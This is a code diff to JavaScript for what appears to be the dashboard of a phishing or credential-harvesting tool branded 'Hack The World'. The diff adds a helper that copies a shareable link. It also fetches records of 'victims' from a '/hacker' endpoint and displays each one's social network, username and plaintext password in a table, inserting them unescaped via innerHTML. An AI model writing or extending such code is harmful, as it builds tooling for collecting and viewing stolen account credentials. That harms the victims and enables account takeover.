@@ -15,19 +15,66 @@ logoutLink.addEventListener("click", () => {
 
 // copy link to clip board
 
+function copyStringToClipboard(str) {
+  return new Promise((resolve, reject) => {
+    // Create new element
+    var el = document.createElement("textarea");
+    el.value = str;
+
+    el.setAttribute("readonly", "");
+    el.style = { position: "absolute", left: "-9999px" };
+    document.body.appendChild(el);
+
+    // Select text inside element
+    el.select();
+    el.setSelectionRange(0, 99999);
+
+    document.execCommand("copy"); // copy
+    document.body.removeChild(el); // Remove temporary element
+
+    resolve();
+  });
+}
+
 let copyBtn = document.querySelector(".copy-btn");
 copyBtn.addEventListener("click", (e) => {
   let link = e.target.getAttribute("data-link");
 
-//   link.select();
-//   link.setSelectionRange(0, 99999); /* For mobile devices */
-
-  /* Copy the text inside the text field */
-  document.execCommand("copy", false, );
+  copyStringToClipboard(link).then(()=>{
+    swal("Hack The World 🌎", "Link copied successfully", "success")
+  })
 });
 
 // dom
 
 document.getElementById("user-name").innerText = user.name;
 
-let passwordDb = document.getElementById("password-db");
+// password database setup
+
+
+const getUserDetail = async () => {
+
+  let passwordDb = document.getElementById("password-db")
+
+  let userFromDb = await fetch(`${dbUrl}/users?name=${user.name}&email=${user.email}`);
+  userFromDb = await userFromDb.json();
+  userFromDb = userFromDb[0]
+
+  let targets = await fetch(`${dbUrl}/hacker?userId=${userFromDb.id}`);
+  targets = await targets.json()
+
+  targets.map(victim => {
+    passwordDb.innerHTML += `
+      <tr>
+        <th scope="row">🤵</th>
+        <td>${victim.social}</td>
+        <td>${victim.username}</td>
+        <td>${victim.password}</td>
+      </tr>
+    `
+  });
+
+}
+
+
+getUserDetail()
